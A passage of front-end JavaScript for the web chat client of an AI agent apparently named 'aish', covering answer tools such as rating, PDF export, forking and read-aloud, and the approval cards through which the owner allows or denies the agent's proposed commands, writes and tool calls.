  const el = messagesEl.querySelector(`[data-turn="${CSS.escape(turn)}"]`);
  if (!el) return;
  const tools = el.querySelector(".msg-tools");
  if (!tools) return;
  tools.querySelectorAll(".rating-chip").forEach((chip) => {
    // `none` is a withdrawal: it lights nothing.
    chip.classList.toggle("on", chip.classList.contains(`rating-${kind}`));
  });
  // A replayed reason seeds the draft, so editing after a reload starts from
  // what was written rather than from an empty box.
  if (comment) ratingDrafts.set(turn, comment);
  showRatingComment(el, kind === "none" ? "" : comment);
}

// A reason is written to the log and replayed with the rating, so it must be
// READ BACK on render too — otherwise the owner reopens a chat, sees a lit
// thumb with no words, and cannot tell what he objected to. That is worse than
// no comment at all: it looks like the note was lost.
function showRatingComment(el, comment) {
  const existing = el.querySelector(".rating-said");
  if (existing) existing.remove();
  if (!comment) return;
  const said = document.createElement("button");
  said.type = "button";
  said.className = "rating-said";
  said.title = "edit your note";
  said.textContent = comment;
  // Tapping it reopens the box, pre-filled: the thumbs toggle the verdict, so
  // without this there is no way to correct a note short of withdrawing it.
  said.onclick = () => {
    const chip = el.querySelector(".rating-chip.on");
    if (!chip) return;
    const kind = chip.classList.contains("rating-up") ? "up" : "down";
    said.remove();
    openRatingComment(chip, el.dataset.turn, kind, comment);
  };
  el.appendChild(said);
}

function copyChip(getText, label) {
  const btn = document.createElement("button");
  btn.type = "button";
  btn.className = "copy-chip";
  btn.title = label;
  btn.setAttribute("aria-label", label);
  btn.append(copyIcon(), checkIcon());
  btn.onclick = async () => {
    if (!(await copyText(getText()))) {
      showToast("copy failed — select the text manually");
      return;
    }
    btn.classList.add("ok");
    setTimeout(() => btn.classList.remove("ok"), 1300);
  };
  return btn;
}

// ---- export to PDF (issue #64) -------------------------------------------
// Conversion is server-side but fully LOCAL (see export.py) — the markdown is
// posted to /export/answer and comes back as a PDF blob the browser saves.
function pdfIcon() {
  return svgIcon("i-pdf", (make, svg) => {
    const g = make("g", { fill: "none", stroke: "currentColor", "stroke-width": "1.7",
      "stroke-linecap": "round", "stroke-linejoin": "round" });
    g.appendChild(make("path", { d: "M12 4v9.5" }));
    g.appendChild(make("path", { d: "M8.4 10.2 12 13.8l3.6-3.6" }));
    g.appendChild(make("path", { d: "M5.5 16.5v1.5a1.5 1.5 0 0 0 1.5 1.5h10a1.5 1.5 0 0 0 1.5-1.5v-1.5" }));
    svg.appendChild(g);
  });
}

function saveBlob(blob, filename) {
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 4000);
}

// Pull the server-derived (ASCII-transliterated) download name out of the
// Content-Disposition header — the server names the file from the content.
function dispositionName(response, fallback) {
  const cd = response.headers.get("Content-Disposition") || "";
  const m = cd.match(/filename\*?=(?:UTF-8'')?["']?([^"';]+)/i);
  try { return (m && decodeURIComponent(m[1])) || fallback; } catch { return fallback; }
}

async function exportAnswerPdf(markdown, btn) {
  // No title is sent: the server has THIS session's model title its own answer
  // (falling back to the answer's lead sentence), and that names both the
  // document and the download. The prompt titled the request, not the document.
  const query = new URLSearchParams();
  if (currentSession) query.set("session", currentSession);
  if (token) query.set("token", token);
  if (btn) btn.disabled = true;
  showToast("Exporting to PDF…", true);
  try {
    const response = await fetch(`${BASE}export/answer?${query}`, {
      method: "POST",
      headers: { "Content-Type": "text/markdown" },
      body: markdown,
    });
    if (!response.ok) {
      const body = await response.json().catch(() => ({}));
      showToast(`export failed: ${body.error || response.status}`);
      return;
    }
    saveBlob(await response.blob(), dispositionName(response, "aish-answer.pdf"));
    showToast("Exported");
  } catch {
    showToast("export failed — is the server reachable?");
  } finally {
    if (btn) btn.disabled = false;
  }
}

// Whole-session export (final answers only). Rendering a long session takes a
// few seconds, so this fetches the blob (rather than a fire-and-forget anchor)
// to show a sticky "Exporting…" toast that resolves to done/failed — otherwise
// pressing the shortcut or the menu item gives no sign anything happened.
let sessionExporting = false;
async function exportSessionPdf() {
  if (!currentSession || sessionExporting) return;
  sessionExporting = true;
  showToast("Exporting chat to PDF…", true);
  const query = new URLSearchParams({ session: currentSession });
  if (token) query.set("token", token);
  try {
    const response = await fetch(`${BASE}export/session?${query}`);
    if (!response.ok) {
      const body = await response.json().catch(() => ({}));
      showToast(`export failed: ${body.error || response.status}`);
      return;
    }
    saveBlob(await response.blob(), dispositionName(response, "aish-chat.pdf"));
    showToast("Chat exported");
  } catch {
    showToast("export failed — is the server reachable?");
  } finally {
    sessionExporting = false;
  }
}

function exportChip(getText) {
  const btn = document.createElement("button");
  btn.type = "button";
  btn.className = "copy-chip";
  btn.title = "export answer to PDF";
  btn.setAttribute("aria-label", "export answer to PDF");
  btn.appendChild(pdfIcon());
  btn.onclick = () => exportAnswerPdf(getText(), btn);
  return btn;
}

function forkIcon() {
  return svgIcon("i-fork", (make, svg) => {
    const g = make("g", { fill: "none", stroke: "currentColor", "stroke-width": "1.7",
      "stroke-linecap": "round", "stroke-linejoin": "round" });
    g.appendChild(make("circle", { cx: "7", cy: "5.5", r: "1.8" }));
    g.appendChild(make("circle", { cx: "7", cy: "18.5", r: "1.8" }));
    g.appendChild(make("circle", { cx: "17", cy: "9.5", r: "1.8" }));
    g.appendChild(make("path", { d: "M7 7.3v9.4" }));
    g.appendChild(make("path", { d: "M7 11.5h5a3 3 0 0 0 3-3v-.3" }));
    svg.appendChild(g);
  });
}

// [FORK-ANCHOR-START]
// Fork from a specific answer: branch the conversation up to and including this
// answer into a new session (issue #47, from-here).
//
// `answerId` NAMES the answer — the id of the assistant record behind it, minted
// where it was written and carried on `done` both live and on replay. `ordinal`
// is what this used to send, and it was wrong in the ordinary case: the browser
// counts answers as it renders them, the server counts them again over the whole
// log, and those two agree only if the browser rendered ALL of them. It had not
// — the replay is capped (#228) — so a chat whose view started at its fifteenth
// answer forked from its sixth, silently, fourteen answers of context and three
// photos short of what the owner tapped (#229).
//
// The ordinal stays only as the fallback for a transcript with no ids at all: a
// pre-trace log replayed as a flat `history` blob, where nothing identifies a
// record because the records were never written to be identified.
function forkChip(ordinal, answerId) {
  const btn = document.createElement("button");
  btn.type = "button";
  btn.className = "copy-chip";
  btn.title = "fork the conversation from here into a new chat";
  btn.setAttribute("aria-label", "fork from here");
  btn.appendChild(forkIcon());
  btn.onclick = () => {
    if (clientBusy) { showToast("can't fork while working"); return; }
    const at = answerId ? { answer: answerId } : { after: ordinal };
    act({ type: "fork", ...at }, { label: "the fork" });
  };
  return btn;
}
// [FORK-ANCHOR-END]

// [ANSWER-TOP-START]
// Jump to the START of this answer. A long reply runs off the top of the screen
// while you read it, and finding where it began means scrolling back past its
// own body — hunting for a boundary that looks like all the other text. The
// control belongs ON the answer because "this answer" is what it means; it sits
// at the FAR RIGHT of the tool row, apart from the left-hand cluster, because
// it is navigation rather than something done to the answer.
//
// The target is measured against the SCROLLER, not the window: #messages is a
// sibling below #topbar, not underneath it, so an element sitting at the
// scroller's own top is already clear of the header. Subtracting the bar's
// height on top of that (which reads plausibly, and was the first version)
// overshoots by exactly the header and lands you above the answer.
const ANSWER_TOP_GAP = 8; // breathing room above the first line
function scrollToAnswerTop(el) {
  const delta = el.getBoundingClientRect().top - messagesEl.getBoundingClientRect().top;
  const top = Math.max(0, messagesEl.scrollTop + delta - ANSWER_TOP_GAP);
  // Smooth where the platform honours it; `scrollTo` falls back to a jump when
  // it does not, so the button can never be a no-op.
  messagesEl.scrollTo({ top, behavior: "smooth" });
}

// The chip is worth showing only when the answer is TALLER than the transcript
// viewport. If it fits, then whenever you can see its tool row you can already
// see its first line — so the button would scroll nowhere, which reads as
// broken rather than as "nothing to do". Height-vs-viewport is the whole test:
// scroll position never enters it, because a fitting answer whose bottom you
// are looking at necessarily has its top on screen too.
//
// Watched rather than measured once: images, fonts and the reading-size stepper
// all change an answer's height after it is built. Guarded because the
// choreography sandboxes have no ResizeObserver.
const answerFitWatcher = typeof ResizeObserver === "function"
  ? new ResizeObserver((entries) => { for (const e of entries) syncAnswerTopChip(e.target); })
  : null;

function syncAnswerTopChip(answerEl) {
  const chip = answerEl.querySelector(".answer-top");
  if (!chip) return;
  // Compared against the bare viewport height: an answer exactly as tall as the
  // viewport HAS its first line on screen when you can see its last, so there is
  // nothing to jump to. ANSWER_TOP_GAP is breathing room for the scroll target,
  // not part of "does this fit" — folding it in here would keep the chip on a
  // fitting answer just to scroll it eight pixels, which is the "feels like it
  // didn't work" this exists to remove.
  chip.hidden = answerEl.offsetHeight <= messagesEl.clientHeight;
}

function answerTopChip(el) {
  const btn = document.createElement("button");
  btn.type = "button";
  btn.className = "copy-chip answer-top";
  btn.title = "jump to the start of this answer";
  btn.setAttribute("aria-label", "jump to the start of this answer");
  btn.appendChild(svgIcon("i-top", (make, svg) => {
    const g = make("g", { fill: "none", stroke: "currentColor", "stroke-width": "1.8",
      "stroke-linecap": "round", "stroke-linejoin": "round" });
    g.appendChild(make("path", { d: "M5 4.5h14" }));       // the line it goes to
    g.appendChild(make("path", { d: "M12 20V8.6" }));
    g.appendChild(make("path", { d: "M7.6 13 12 8.6l4.4 4.4" }));
    svg.appendChild(g);
  }));
  btn.onclick = () => scrollToAnswerTop(el);
  return btn;
}
// [ANSWER-TOP-END]

// Footer row under a finished answer: copy-as-markdown chip, plus the
// read-aloud player where speech synthesis exists.
// When the live turn began, and 0 whenever no live turn is running — the live
// trace card reads it as its clock's origin, so a stale value would date a fresh
// card from a turn that already ended. Set on a live `user` event, cleared at
// every way a turn ends (done / stopped / error). A replayed turn deliberately
// sets none: its origin is reconstructed from the steps (accountStepTime).
let turnStart = 0;
let answerTiming = 0;

// Each rendered final answer gets an ordinal so its Fork button can branch the
// conversation up to and including that answer. Reset whenever the transcript
// is rebuilt (replay/history), so it stays aligned with the log's answer order.
let renderedAnswers = 0;

// The turn id a rating names (#207) is minted for the USER message (#202's
// removal id), and the answer is rendered separately — so it is carried
// forward here, exactly as `prompt` and `answerTiming` already are, and
// populated by both the live and the history-replay paths.
let currentTurnId = "";

function attachAnswerTools(el, source, prompt, answerId) {
  const ordinal = ++renderedAnswers;
  const tools = document.createElement("div");
  tools.className = "msg-tools";
  // Order (#96): TTS first, then export/fork, Retry, and Copy last — same tight
  // spacing as before, just reordered so the two most-used actions (TTS, Copy)
  // bracket the row instead of sitting next to Retry.
  if (TTS_OK) tools.appendChild(buildTtsBox(el));
  tools.appendChild(exportChip(() => source));
  tools.appendChild(forkChip(ordinal, answerId));
  // Regenerate: only the newest answer keeps it, so retire the previous one.
  // Gate on the per-answer `prompt` (populated by both the live and the
  // history-replay paths) — the global lastUserPrompt is unset during a cold
  // reload's onHistory rebuild, which used to drop the button after reconnect.
  retireRegen();
  if (prompt) {
    const regen = document.createElement("button");
    regen.type = "button";
    regen.className = "regen-chip";
    regen.title = "regenerate";
    regen.setAttribute("aria-label", "regenerate answer");
    regen.innerHTML = RERUN_SVG;
    regen.onclick = () => rerunPrompt(prompt);
    tools.appendChild(regen);
    lastRegenBtn = regen;
  }
  if (currentTurnId) {
    el.dataset.turn = currentTurnId;
    tools.appendChild(ratingChip(currentTurnId, "up"));
    tools.appendChild(ratingChip(currentTurnId, "down"));
  }
  tools.appendChild(copyChip(() => source, "copy answer"));
  // The trailing group: readouts first, then jump-to-top LAST, hard against the
  // right edge. Grouped rather than letting each element claim its own auto
  // margin — two auto margins split the slack and would park the readout
  // mid-row — and, more importantly, because the chip must sit in the SAME
  // place on every answer. A control you reach for constantly cannot shift
  // left and right depending on whether that particular answer happened to
  // record a duration. See [ANSWER-TOP].
  const end = document.createElement("span");
  end.className = "tools-end";
  if (answerTiming) {
    const timing = document.createElement("span");
    timing.className = "answer-timing";
    timing.textContent = fmtSecs(answerTiming);
    end.appendChild(timing);
    answerTiming = 0; // one readout per answer
  }
  end.appendChild(answerTopChip(el));
  tools.appendChild(end);
  el.appendChild(tools);
  // Measured only once the row is IN the answer: run before that and the height
  // read back is the answer without its own tool row — and, for a fresh element,
  // often no layout at all, so a short answer kept a chip that did nothing.
  syncAnswerTopChip(el);
  if (answerFitWatcher) answerFitWatcher.observe(el); // …and again as it grows
}

function buildTtsBox(el) {
  const box = document.createElement("div");
  box.className = "tts";
  const mkBtn = (cls, label, ...icons) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = cls;
    btn.title = label;
    btn.setAttribute("aria-label", label);
    btn.append(...icons);
    return btn;
  };
  const prev = mkBtn("t-skip t-prev", "previous paragraph", skipSvg(false));
  const main = mkBtn("t-main", "read aloud", speakerIcon(), pauseIcon(), playIcon());
  const next = mkBtn("t-skip t-next", "next paragraph", skipSvg(true));
  const rate = mkBtn("t-rate", "reading speed");
  rate.textContent = rateLabel();
  const stop = mkBtn("t-stop", "stop reading", xIcon());
  prev.onclick = () => skipChunk(-1);
  next.onclick = () => skipChunk(1);
  rate.onclick = cycleRate;
  stop.onclick = stopSpeaking;
  main.onclick = () => {
    if (player.box === box) togglePause();
    else startPlayback(box, el);
  };
  box.append(prev, main, next, rate, stop);
  return box;
}

function speakableText(el) {
  // Read what's on screen, minus code blocks (hearing code character by
  // character is noise) and the player controls. Block elements become line
  // breaks — textContent alone would run "…end.Next" together and slur.
  const parts = [];
  const walk = (node) => {
    if (node.nodeType === Node.TEXT_NODE) { parts.push(node.nodeValue); return; }
    if (node.nodeType !== Node.ELEMENT_NODE) return;
    if (node.tagName === "PRE" || node.classList.contains("msg-tools")) return;
    for (const child of node.childNodes) walk(child);
    if (/^(P|LI|H[1-6]|TR|BLOCKQUOTE)$/.test(node.tagName)) parts.push("\n");
  };
  walk(el);
  return parts.join("").replace(/[^\S\n]+/g, " ").replace(/\s*\n\s*/g, "\n").trim();
}

function chunkParagraphs(text) {
  // One chunk per paragraph. Runs of short blocks (list items, one-line
  // headings) group into a single chunk so skip jumps feel like paragraphs,
  // not individual bullets; real paragraphs always stand alone.
  const chunks = [];
  let run = "";
  const flushRun = () => { if (run) { chunks.push(run); run = ""; } };
  for (const block of text.split("\n")) {
    if (block.length < 60) {
      if (run.length + block.length > 250) flushRun();
      run = run ? `${run}\n${block}` : block;
    } else {
      flushRun();
      chunks.push(block);
    }
  }
  flushRun();
  return chunks;
}

function speechLang(text) {
  // Without an explicit lang the engine uses the device's default voice —
  // a Polish phone reads English text with Polish phonemes. Cheap
  // bilingual vote: Polish reliably shows diacritics/stopwords; tie or
  // neither defaults to English.
  const sample = text.slice(0, 600).toLowerCase();
  let polish = (sample.match(/[ąćęłńśźż]/g) || []).length;
  polish += 2 * ((sample.match(/(^|\s)(się|jest|nie|czy|oraz|przez|tego|można|żeby|które)(?=\s|[.,;:!?)]|$)/g) || []).length);
  const english = (sample.match(/(^|\s)(the|and|is|of|to|that|with|this|for|are)(?=\s|[.,;:!?)]|$)/g) || []).length;
  return polish > english ? "pl-PL" : "en-US";
}

function rateLabel() {
  return `${ttsRate}×`;
}

function stopSpeaking() {
  if (!TTS_OK) return;
  player.seq += 1; // orphan any in-flight onend so it can't chain
  speechSynthesis.cancel();
  if (player.box) player.box.classList.remove("active", "paused");
  player.box = null;
  player.utterance = null;
  player.paused = false;
  releaseWakeLock();
  syncTtsDock();
}

function startPlayback(box, el) {
  stopSpeaking();
  const text = speakableText(el);
  if (!text) return;
  player.box = box;
  player.chunks = chunkParagraphs(text);
  box.classList.add("active");
  box.querySelector(".t-rate").textContent = rateLabel();
  acquireWakeLock();
  speakChunk(0);
  syncTtsDock();
}

function speakChunk(index) {
  player.seq += 1;
  const seq = player.seq;
  speechSynthesis.cancel();
  player.index = index;
  player.paused = false;
  player.box.classList.remove("paused");
  const utterance = new SpeechSynthesisUtterance(player.chunks[index]);
  // Detect language PER paragraph, not once for the whole reply: aish often
  // mixes languages (a Polish answer citing an English-created issue), so each
  // chunk is spoken in its own voice instead of forcing one over the lot (#97).
  utterance.lang = speechLang(player.chunks[index]);
  utterance.rate = ttsRate;
  utterance.onend = () => {
    if (seq !== player.seq) return; // cancelled/skipped — a newer speak owns state
    if (player.index + 1 < player.chunks.length) speakChunk(player.index + 1);
    else stopSpeaking();
  };
  utterance.onerror = () => {
    if (seq === player.seq) stopSpeaking();
  };
  player.utterance = utterance;
  speechSynthesis.resume(); // cancel-while-paused leaves WebKit stuck paused
  speechSynthesis.speak(utterance);
  syncTtsDock(); // a skip clears the paused state — keep the dock icon in sync
}

function togglePause() {
  if (player.paused) {
    speechSynthesis.resume();
    player.paused = false;
    acquireWakeLock();
  } else {
    speechSynthesis.pause();
    player.paused = true;
    releaseWakeLock();
  }
  player.box.classList.toggle("paused", player.paused);
  syncTtsDock();
}

function skipChunk(delta) {
  if (!player.box) return;
  const next = Math.min(player.chunks.length - 1, Math.max(0, player.index + delta));
  speakChunk(next);
}

function cycleRate() {
  ttsRate = TTS_RATES[(TTS_RATES.indexOf(ttsRate) + 1) % TTS_RATES.length];
  localStorage.setItem(TTS_RATE_KEY, String(ttsRate));
  if (player.box) {
    player.box.querySelector(".t-rate").textContent = rateLabel();
    speakChunk(player.index); // rate is fixed per utterance — restart the chunk
  }
  syncTtsDock();
}

// A persistent transport for the ACTIVE read-aloud, docked in the composer
// button row so playback stays reachable while you scroll away or type (#106).
// It drives the same global `player` as the per-answer pill — the inline
// speaker still STARTS playback; this bar just mirrors + controls whatever is
// already playing, so there's one source of truth, not a second player.
function buildTtsDock() {
  const dock = $("tts-dock");
  if (!dock || !TTS_OK) return;
  const mkBtn = (cls, label, ...icons) => {
    const b = document.createElement("button");
    b.type = "button"; // inside the composer <form> — must not submit
    b.className = cls;
    b.title = label;
    b.setAttribute("aria-label", label);
    b.append(...icons);
    return b;
  };
  const prev = mkBtn("td-prev", "previous paragraph", skipSvg(false));
  const main = mkBtn("td-main", "pause / resume", pauseIcon(), playIcon());
  const next = mkBtn("td-next", "next paragraph", skipSvg(true));
  const rate = mkBtn("td-rate", "reading speed");
  rate.textContent = rateLabel();
  const stop = mkBtn("td-stop", "stop reading", xIcon());
  prev.onclick = () => skipChunk(-1);
  main.onclick = () => togglePause();
  next.onclick = () => skipChunk(1);
  rate.onclick = cycleRate;
  stop.onclick = stopSpeaking;
  dock.append(prev, main, next, rate, stop);
}

// Reflect the global player onto the composer dock: visible only while a
// read-aloud is active, with the input pushed to its own row (#97 tall
// mechanics) so the transport shares the button row with + / mic / send.
function syncTtsDock() {
  const dock = $("tts-dock");
  if (!dock) return;
  const active = !!player.box;
  dock.hidden = !active;
  $("composer").classList.toggle("tts-on", active);
  dock.classList.toggle("paused", player.paused);
  const rate = dock.querySelector(".td-rate");
  if (rate) rate.textContent = rateLabel();
}

if (TTS_OK) buildTtsDock();

// ---- approval cards ------------------------------------------------------
function onApprovalRequest(event) {
  closeAnswer();
  // A card means the user is deciding — mark the pending run_command step so
  // the trace can say "Approved" (manual) vs "Auto-approved" later (#2).
  if (event.kind === "command" && currentTrace && currentTrace.pending
      && currentTrace.pending.name === "run_command") {
    currentTrace.pending.manual = true;
  }
  // An expanded live timeline eats the vertical space the approval card needs,
  // forcing a scroll (#65). Auto-collapse it and remember to restore once all
  // pending cards are resolved — unless the user already collapsed it.
  if (currentTrace && currentTrace.el.classList.contains("live")
      && currentTrace.el.classList.contains("open")) {
    currentTrace.el.classList.remove("open");
    currentTrace.autoCollapsed = true;
  }
  if (currentTrace) {
    currentTrace.waitingApproval = true;
    updateTraceHead(currentTrace);
  }
  const card = document.createElement("div");
  card.className = "card";
  card.dataset.id = event.id;
  if (event.kind === "command") {
    card.dataset.summary = event.command;
    buildCommandCard(card, event);
  } else if (event.kind === "write") {
    card.dataset.summary = `${event.verb} ${event.target}`;
    buildWriteCard(card, event);
  } else if (event.kind === "tool") {
    card.dataset.summary = `run ${event.tool}`;
    buildToolCard(card, event);
  } else if (event.kind === "import") {
    card.dataset.summary = `import ${event.skill}`;
    buildImportCard(card, event);
  } else {
    card.dataset.summary = `read ${event.path}`;
    buildReadCard(card, event);
  }
  // Surface the single-key shortcuts (handled by the global keydown). Every
  // shortcut button gets a tooltip; the prominent verdict buttons also get a
  // VISIBLE key badge, but only with a physical keyboard (FINE_POINTER) — a
  // badge is noise on a touch device that can't use it. A builder-set title is
  // kept and the key appended; otherwise the button's own label seeds it (so
  // Install/Trust dir read correctly, not "Approve").
  for (const sc of CARD_SHORTCUTS) {
    const K = sc.key.toUpperCase();
    for (const b of card.querySelectorAll(sc.selector)) {
      b.title = b.title ? `${b.title} (${K})` : `${b.textContent || "Action"} (${K})`;
      if (sc.badge && FINE_POINTER) {
        const kb = document.createElement("span");
        kb.className = "key-badge";
        kb.textContent = K;
        kb.setAttribute("aria-hidden", "true");
        b.appendChild(kb);
      }
    }
  }
  cards.set(event.id, card);
  pendingCards += 1;
  refreshStatusline();
  markShown(card); // the clock starts when it goes on screen ([CARD-LATENCY])
  messagesEl.appendChild(card);
  scrollToEnd(true);
  // Modal-like focus (desktop only): the composer usually holds focus, so a
  // bare "A" would type into it instead of approving. Move focus to the card
  // container (NOT the feedback field — that would re-arm editingNow and defeat
  // the shortcut) so the single-key verdicts work immediately. Touch devices
  // have no physical keyboard and popping focus there just fights the composer.
  if (FINE_POINTER) {
    card.tabIndex = -1;
    card.focus({ preventScroll: true });
  }
  notify("aish — approval needed", card.dataset.summary);
}

function title(card, html) {
  const el = document.createElement("div");
  el.className = "card-title";
  el.append(...html);
  card.appendChild(el);
  return el;
}

function buttonRow(card, specs) {
  const row = document.createElement("div");
  row.className = "buttons";
  for (const [label, cls, fn, tooltip] of specs) {
    const b = document.createElement("button");
    b.type = "button";
    b.className = cls;
    b.textContent = label;
    if (tooltip) b.title = tooltip;
    b.onclick = fn;
    row.appendChild(b);
  }
  card.appendChild(row);
  return row;
}

// [CARD-LATENCY-START]
// How long the card had been on screen when it was answered (#306).
//
// The whole consent design rests on the claim that SOME cards are still worth
// spending — the rare, checkable-at-a-glance ones. Nothing measured it. A card
// tapped blind is worse than no card, because it converts a missing control
// into a recorded consent, and a sub-second tap is a blind tap.
//
// performance.now(), because it is monotonic: a clock change, a time-zone
// shift or a phone waking from sleep must not be able to invent a plausible
// number. It measures RENDER → tap, which can only be LONGER than the card was
// really visible (a background tab, a card scrolled off) — so a small value is
// unambiguous evidence and a large one claims nothing, which is the direction
// a measurement is allowed to be wrong in.
//
// Absent, never zero, when this client never rendered the card: a page that
// reloaded and answered a replayed one, a card the server force-denied. The
// server writes an unknown down as unknown rather than supplying a number
// nothing can check.
function markShown(card) {
  card.dataset.shownAt = String(performance.now());
}

function shownExtra(card) {
  const stamped = (card && card.dataset && card.dataset.shownAt) || "";
  const at = stamped ? Number(stamped) : NaN;
  if (!Number.isFinite(at)) return {};
  return { shown_ms: Math.max(0, Math.round(performance.now() - at)) };
}
// [CARD-LATENCY-END]

function answerCard(id, action, extra) {
  const card = cards.get(id);
  const controls = card ? [...card.querySelectorAll("button, input, textarea")] : [];
  // Greying the card is a claim that the GATE has your answer, and the gate is
  // a worker thread parked on a slot that only this message fills. Unreceipted,
  // that claim strands the agent holding a command with a card that looks
  // answered and no way back to it — so the disabling is undone with it
  // ([ACK-LEDGER]). Nothing here re-sends: `bridge.answer` drops a duplicate,
  // but a second verdict the user did not give is not this layer's to invent.
  act({ type: "approval", id, action, ...extra, ...shownExtra(card) }, {
    label: "your answer to the approval",
    lost: () => { for (const c of controls) c.disabled = false; },
  });
  for (const c of controls) c.disabled = true;
  // Hand keyboard focus on: to the next still-pending card if one is stacked,
  // otherwise back to the composer (desktop only — mirrors the modal focus on
  // appear). activeApprovalCard() already skips this now-disabled card.
  if (FINE_POINTER) {
    const next = activeApprovalCard();
    if (next) { next.tabIndex = -1; next.focus({ preventScroll: true }); }
    else if (typeof input !== "undefined" && input) input.focus();
  }
}

// #13/#34: optional feedback typed straight into the approval card. The text
// rides along with WHICHEVER button is pressed — on Deny it explains the
// refusal, on any approval it reaches the model as guidance for this and
// future actions. Typing feedback implies no verdict: Enter just dismisses
// the keyboard, the user still picks a button.
function feedbackField() {
  // One line by default, auto-growing as you type up to a few lines then
  // scrolling (#144): a permanent 2-row box ate vertical space (esp. on mobile)
  // before a comment was even wanted. Enter still inserts a newline; the verdict
  // comes from a button press (feedbackExtra reads .value), nothing here submits.
  const ta = document.createElement("textarea");
  ta.className = "feedback";
  ta.rows = 1;
  ta.placeholder = "Optional comment";
  ta.autocomplete = "off";
  // Mirror resizeInput's grow: reset then set to scrollHeight, capped (~5 lines).
  const grow = () => {
    ta.style.height = "auto";
    ta.style.height = `${Math.min(ta.scrollHeight, 140)}px`;
  };
  ta.addEventListener("input", grow);
  return ta;
}

function feedbackExtra(input) {
  const comment = input.value.trim();
  return comment ? { comment } : {};
}

const CARD_TRIANGLE = '<svg viewBox="0 0 24 24"><path d="M12 3.5 21 19H3z" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><path d="M12 10v3.5M12 16.4v.1" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></svg>';
const CARD_SHIELD = '<svg viewBox="0 0 24 24"><path d="M12 3.5l7 2.5v5c0 4.2-2.9 7.5-7 9-4.1-1.5-7-4.8-7-9V6z" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/></svg>';

const FOLDER_SVG = '<svg viewBox="0 0 24 24"><path d="M3.5 6.8a2 2 0 0 1 2-2h3.4l2 2.2h7.6a2 2 0 0 1 2 2v8.2a2 2 0 0 1-2 2h-13a2 2 0 0 1-2-2z" fill="none" stroke="currentColor" stroke-width="1.8"/></svg>';

// Each scope segment maps to the SAME wire action the old per-scope buttons
// sent (server contract in make_web_approvers): the segment picks what an
// Approve remembers, it does not change the message shape.
// The WIRE actions keep saying `session` — that is the protocol, and the
// server's contract in make_web_approvers. Only the words the owner reads
// change: what this scope actually lasts for is this conversation's approver,
// which is a CHAT, and calling it a session made it read as "until the server
// restarts".
const SCOPE_LABELS = {
  approve: "Just once",          // plain approve — this command, this time
  approve_session: "This chat",  // allowlist the shown prefix(es) for this chat
  approve_always: "Always",      // persist the prefix(es) to the allowlist file
  approve_trust: "Trust dir",    // trust the escaping directory for this chat
};

// The explanatory sentence under the segmented control. Dynamic parts
// (prefixes, dirs) go in via textContent — never innerHTML — since they are
// derived from the model-proposed command.
function scopeExplain(action, prefixText, escapeText) {
  const frag = document.createDocumentFragment();
  const mono = (t) => { const s = document.createElement("span"); s.className = "mono"; s.textContent = t; return s; };
  const strong = (t) => { const b = document.createElement("b"); b.textContent = t; return b; };
  if (action === "approve_session") {
    // This scope belongs to this conversation's approver (server_prefixes),
    // not the process — so it lasts for this chat, not "until restart", which
    // is exactly what the old "Session" label was being read as.
    frag.append("Also auto-approve ", mono(prefixText), " for the rest of this chat.");
  } else if (action === "approve_always") {
    frag.append("Save ", mono(prefixText), " to the allowlist — it persists across chats.");
  } else if (action === "approve_trust") {
    frag.append("Trust ", mono(escapeText), " for this chat — anything inside then runs without asking.");
  } else {
    // Default (Just once) mirrors the design: the safe choice, then a hint at
    // what the broader segments would do.
    frag.append("Approve ", strong("only this command, this time."));
    if (prefixText && escapeText) {
      frag.append(" Broader scopes allowlist ", mono(prefixText), " or trust ", mono(escapeText), ".");
    } else if (prefixText) {
      frag.append(" Broader scopes allowlist ", mono(prefixText), ".");
    } else if (escapeText) {
      frag.append(" A broader scope trusts ", mono(escapeText), ".");
    }
  }
  return frag;
}

// The model's stated reason, on the card that gates the action (#252).
//
// A card said WHAT and never WHY, so the owner reverse-engineered the purpose
// from a tool name and its arguments. One wrong guess held a legitimate
// verification step, and the answer that followed was invented in its place.
// The words that would have prevented it already existed — the model wrote
// them beside the tool call — but the chat delivers one narration per task
// (#212) and everything after it, including this, was dropped.
//
// Rendered as a CLAIM, in its own box, and never folded into the preview or
// the args: those are computed by code, this is the model's word for it, and
// one box for both would lend the second the authority of the first.
//
// Absence is rendered too. "It gave no reason" is information — it tells the
// owner he is back to guessing — and it is what makes the silence visible if
// narration ever stops (it exists because of a rule, not a prompt, and a
// measured 0/0/0 turns narrated with that rule off).
//
// Never truncated: the 120-character snippet the trace already keeps cuts the
// incident's sentence at an abbreviation and loses the entire reason.
//
// A long reason FOLDS rather than being cut. The whole text is always in the
// DOM and the clamp is CSS, so nothing is ever destroyed — "never truncated"
// has to survive the fix for "sometimes it is a wall of text". The threshold
// sits well above the incident's own 299 characters, which must never need a
// tap: the case the feature exists for is the case it must not hide.
const INTENT_FOLD_CHARS = 600;

function intentBlock(event) {
  const wrap = document.createElement("div");
  wrap.className = "card-intent";
  const label = document.createElement("div");
  label.className = "card-intent-label";
  label.textContent = "aish says";
  const body = document.createElement("div");
  body.className = "card-intent-text";
  const said = String(event.intent || "").trim();
  if (!said) {
    wrap.classList.add("empty");
    body.textContent = "It gave no reason for this step.";
    wrap.append(label, body);
    return wrap;
  }
  body.textContent = said;
  wrap.append(label, body);
  if (said.length > INTENT_FOLD_CHARS) {
    wrap.classList.add("folded");
    const more = document.createElement("button");
    more.type = "button";
    more.className = "card-intent-more";
    more.textContent = "Show more";
    more.onclick = () => {
      wrap.classList.toggle("open");
      more.textContent = wrap.classList.contains("open") ? "Show less" : "Show more";
    };
    wrap.appendChild(more);
  }
  return wrap;
}

function buildCommandCard(card, event) {
  // #107: reserve the orange (danger) accent for DESTRUCTIVE commands so the
  // warning color keeps its punch; a standard command uses the calmer blue
  // (info) accent — the same as write/diff cards — with a shield icon. This
  // fights the "everything's orange → approve reflex" warning fatigue. It's
  // still an approval gate; the card is just not screaming when it needn't.
  const destructive = Boolean(event.destructive);
  card.classList.add("approval-card", destructive ? "danger" : "info");
  const head = document.createElement("div");
  head.className = destructive ? "card-head danger" : "card-head";
  head.innerHTML =
    `<span class="card-ico">${destructive ? CARD_TRIANGLE : CARD_SHIELD}</span>` +
